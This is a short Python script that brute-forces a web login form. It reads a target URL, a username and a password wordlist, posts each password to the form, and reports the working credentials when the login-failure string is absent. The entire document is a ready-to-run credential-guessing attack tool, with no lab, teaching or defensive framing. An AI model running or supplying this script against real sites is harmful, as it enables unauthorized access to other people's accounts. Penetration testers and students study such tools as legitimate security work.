#!/usr/bin/python3
import requests

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File to Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(optional): ')


def cracking(username, url, password):
    password = password.strip()
    print('Trying: ' + password)
    data = {'username': username, 'password': password, 'Login': 'submit'}

    if cookie_value != '':
        response = requests.post(url, data=data, cookies={'Cookie': cookie_value})
    else:
        response = requests.post(url, data=data)
    if login_failed_string in response.text:
        print('Password not found: ' + password)
    else:
        print('[+] Found Username: ==> ' + username)
        print('[+] Found password: ==> ' + password)
        exit()


with open(password_file, 'r') as password_list:
    for password in password_list:
        cracking(username, url, password)

print('[+] Password not in list')
